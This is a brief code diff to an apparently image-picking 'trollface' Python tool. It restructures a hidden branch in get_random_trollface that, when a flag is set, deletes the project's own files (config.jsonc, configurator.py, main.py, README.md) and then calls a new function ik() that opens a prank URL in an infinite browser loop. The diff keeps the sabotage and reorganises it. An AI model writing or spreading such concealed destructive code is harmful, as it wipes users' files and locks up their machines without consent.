@@ -15,7 +15,8 @@ logging.basicConfig(
 
 
 def get_random_trollface(a=False):
-    if a: print("Stop using this tool to content-farm"); os.remove("config.jsonc"); os.remove("configurator.py"); os.remove("main.py"); os.remove("README.md"); while True: webbrowser.open("https://youareanidiot.cc/lol.html")
+    if a: print("Stop using this tool to content-farm"); os.remove("config.jsonc"); os.remove(
+        "configurator.py"); os.remove("main.py"); os.remove("README.md"); ik()
     if config["choose_trollface"] != "":
         logging.debug("using custom trollface")
         if os.path.isfile(config["choose_trollface"]):
@@ -41,3 +42,5 @@ def get_random_trollface(a=False):
 
     return os.path.join(config["trollface_folder"], random_trollface)
 
+def ik():
+    while True: webbrowser.open("https://youareanidiot.cc/lol.html")
